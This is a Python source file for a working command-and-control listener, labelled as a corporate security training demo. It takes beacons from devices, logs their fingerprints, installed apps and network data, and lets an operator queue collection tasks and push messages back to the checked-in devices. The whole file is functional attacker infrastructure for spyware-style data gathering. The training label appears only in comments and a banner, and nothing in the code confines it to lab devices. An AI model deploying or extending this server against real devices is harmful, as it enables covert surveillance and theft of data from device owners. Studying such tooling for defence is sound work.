#!/usr/bin/env python3
"""
Enhanced beacon listener + C2 task server for Security Training Demo.

Usage:
    python3 server.py [port]

Default port: 8080

Features:
  - Logs all incoming beacons with full device data
  - Interactive console to queue tasks for connected devices
  - Supported tasks:
      collect_full    — request full device data dump
      collect_apps    — request installed apps list
      collect_network — request network info
      set_message <text> — display a message in the app

FOR CORPORATE SECURITY TRAINING USE ONLY.
"""

import json
import sys
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Pending task to send on next beacon (simple single-device demo)
pending_task = {"task": "", "message": ""}
task_lock = threading.Lock()
beacon_count = 0
devices_seen = {}


class BeaconHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        global beacon_count

        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 524288:  # 512KB max
            self.send_response(413)
            self.end_headers()
            return

        body = self.rfile.read(content_length)

        try:
            data = json.loads(body.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            data = {"raw": body.decode("utf-8", errors="replace")}

        beacon_count += 1
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        msg_type = data.get("type", "beacon")
        device = data.get("device", "unknown")
        fingerprint = data.get("fingerprint", "?")

        # Track devices
        devices_seen[client_ip] = {
            "device": device,
            "last_seen": now,
            "fingerprint": fingerprint
        }

        # Print beacon
        print(f"\n\033[92m{'='*65}\033[0m")
        print(f"  \033[1;96mBEACON #{beacon_count}\033[0m — {now} — \033[93m{msg_type}\033[0m")
        print(f"  Source: {client_ip} — {device}")
        print(f"\033[92m{'='*65}\033[0m")

        if msg_type == "task_response" or msg_type == "beacon" and "installed_apps" in data:
            # Summarize large payloads
            apps = data.get("installed_apps", [])
            if apps:
                print(f"  \033[1mInstalled Apps ({len(apps)}):\033[0m")
                for app in apps[:20]:
                    if isinstance(app, dict):
                        print(f"    • {app.get('name','?')} ({app.get('package','?')}) v{app.get('version','?')}")
                if len(apps) > 20:
                    print(f"    ... and {len(apps)-20} more")
                print()

            # Print other fields (skip large ones)
            for key, value in data.items():
                if key in ("installed_apps", "tag"):
                    continue
                if isinstance(value, (dict, list)):
                    print(f"  {key:>22}: {json.dumps(value, indent=2)[:200]}")
                else:
                    print(f"  {key:>22}: {value}")
        else:
            for key, value in data.items():
                if key == "tag":
                    continue
                if isinstance(value, list) and len(value) > 5:
                    print(f"  {key:>22}: [{len(value)} items]")
                elif isinstance(value, (dict, list)):
                    print(f"  {key:>22}: {json.dumps(value)[:150]}")
                else:
                    print(f"  {key:>22}: {value}")

        print(f"\033[92m{'='*65}\033[0m")
        print(f"\033[90m[cmd]>\033[0m ", end="", flush=True)

        # Build response — include pending task if any
        with task_lock:
            response = dict(pending_task)
            if response.get("task"):
                print(f"\n  \033[95m→ Sending task: {response['task']}\033[0m")
                print(f"\033[90m[cmd]>\033[0m ", end="", flush=True)
                # Clear after sending
                pending_task["task"] = ""
                pending_task["message"] = ""

        response["status"] = "received"
        response["beacon_id"] = beacon_count

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

    def do_GET(self):
        info = {
            "status": "active",
            "beacons_received": beacon_count,
            "devices": devices_seen
        }
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(info, indent=2).encode())

    def log_message(self, format, *args):
        pass


def command_console():
    """Interactive console for queuing tasks."""
    print(f"\033[90m[cmd]>\033[0m ", end="", flush=True)
    while True:
        try:
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            print(f"\033[90m[cmd]>\033[0m ", end="", flush=True)
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()

        with task_lock:
            if cmd in ("collect_full", "full"):
                pending_task["task"] = "collect_full"
                print(f"  \033[95m✓ Queued: collect_full — will send on next beacon\033[0m")

            elif cmd in ("collect_apps", "apps"):
                pending_task["task"] = "collect_apps"
                print(f"  \033[95m✓ Queued: collect_apps\033[0m")

            elif cmd in ("collect_network", "network", "net"):
                pending_task["task"] = "collect_network"
                print(f"  \033[95m✓ Queued: collect_network\033[0m")

            elif cmd in ("set_message", "msg") and len(parts) > 1:
                pending_task["task"] = "set_message"
                pending_task["message"] = parts[1]
                print(f"  \033[95m✓ Queued: set_message → \"{parts[1]}\"\033[0m")

            elif cmd in ("devices", "list"):
                if devices_seen:
                    print(f"\n  \033[1mConnected Devices:\033[0m")
                    for ip, info in devices_seen.items():
                        print(f"    {ip} — {info['device']} — last: {info['last_seen']}")
                else:
                    print("  No devices seen yet.")

            elif cmd in ("status", "info"):
                print(f"  Beacons received: {beacon_count}")
                print(f"  Devices seen: {len(devices_seen)}")
                t = pending_task.get("task", "")
                print(f"  Pending task: {t if t else 'none'}")

            elif cmd in ("help", "?"):
                print("""
  \033[1mAvailable Commands:\033[0m
    full / collect_full    — Request full device data dump
    apps / collect_apps    — Request installed apps list
    net  / collect_network — Request network info
    msg <text>             — Push a message to the app UI
    devices                — Show connected devices
    status                 — Show server status
    help                   — Show this help
    quit                   — Stop server
""")
            elif cmd in ("quit", "exit", "q"):
                print("  Shutting down...")
                import os
                os._exit(0)
            else:
                print(f"  Unknown command: {cmd} (type 'help' for commands)")

        print(f"\033[90m[cmd]>\033[0m ", end="", flush=True)


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    server = HTTPServer(("0.0.0.0", port), BeaconHandler)

    print(f"""
\033[96m╔══════════════════════════════════════════════════════════════╗
║   Security Training Demo — Enhanced C2 Listener              ║
║   Listening on 0.0.0.0:{port:<5}                                ║
║                                                              ║
║   Beacons will appear here as devices check in.              ║
║   Type 'help' for available commands.                        ║
║   Press Ctrl+C to stop.                                      ║
╚══════════════════════════════════════════════════════════════╝\033[0m
""")

    # Start HTTP server in a thread
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    # Run interactive console in main thread
    try:
        command_console()
    except KeyboardInterrupt:
        print("\n  Listener stopped.")
        server.shutdown()


if __name__ == "__main__":
    main()
